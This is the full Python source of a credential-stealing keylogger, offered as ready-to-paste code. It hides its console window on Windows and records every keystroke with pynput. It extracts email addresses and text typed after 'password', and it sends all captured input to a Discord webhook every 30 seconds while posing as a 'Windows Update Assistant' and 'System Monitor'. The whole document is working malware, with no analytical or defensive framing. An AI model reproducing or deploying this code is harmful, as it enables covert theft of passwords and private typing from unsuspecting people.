# Save as: production_keylogger.py
# COPY AND PASTE THIS ENTIRE CODE:

import sys
import os
import time
from datetime import datetime

# Hide window on Windows
if sys.platform == "win32":
    try:
        import ctypes
        ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
    except:
        pass

# === YOUR DISCORD WEBHOOK ===
WEBHOOK_URL = "YOUR_WEBHOOK_HERE"
# ============================

def send_discord(message):
    """Send message to Discord"""
    try:
        import requests
        payload = {"content": message, "username": "System Monitor"}
        requests.post(WEBHOOK_URL, json=payload, timeout=5)
        return True
    except:
        return False

def log_local(message):
    """Log to local file as backup"""
    try:
        with open("system_log.txt", "a", encoding="utf-8") as f:
            f.write(f"{datetime.now()}: {message}\n")
    except:
        pass

def main():
    # Send startup message
    send_discord("🟢 **Windows Update Assistant** - System monitoring activated")
    log_local("Application started")
    
    try:
        from pynput import keyboard
    except ImportError:
        send_discord("❌ Keyboard monitoring unavailable")
        return
    
    buffer = ""
    key_count = 0
    last_sent = time.time()
    
    def on_press(key):
        nonlocal buffer, key_count, last_sent
        key_count += 1
        
        try:
            # Handle key press
            if hasattr(key, 'char') and key.char:
                char = key.char
                buffer += char
            else:
                key_name = str(key)
                if 'Key.space' in key_name:
                    buffer += " "
                elif 'Key.enter' in key_name:
                    buffer += "\n"
                elif 'Key.backspace' in key_name:
                    buffer = buffer[:-1] if buffer else ""
            
            # Check for credentials
            if '@' in buffer and '.' in buffer:
                # Email detection
                for word in buffer.split():
                    if '@' in word and '.' in word:
                        send_discord(f"🚨 **EMAIL DETECTED**: ```{word}```")
                        log_local(f"EMAIL: {word}")
                        buffer = buffer.replace(word, "")
            
            if 'password' in buffer.lower():
                idx = buffer.lower().find('password')
                if len(buffer) > idx + 8:
                    text = buffer[idx+8:idx+30]
                    send_discord(f"🔑 **PASSWORD FIELD**: ```{text}```")
                    log_local(f"PASSWORD: {text}")
            
            # Send periodic updates
            current_time = time.time()
            if current_time - last_sent > 30 and buffer:  # Every 30 seconds
                recent = buffer[-100:]
                send_discord(f"📝 **Recent Activity**: ```{recent}```")
                last_sent = current_time
            
            # Clean buffer
            if len(buffer) > 200:
                buffer = buffer[-100:]
                
        except Exception:
            pass
        
        return True
    
    def on_release(key):
        return True
    
    # Start listening
    try:
        with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
            listener.join()
    except Exception as e:
        send_discord(f"❌ Monitoring error: {str(e)}")

if __name__ == "__main__":
    main()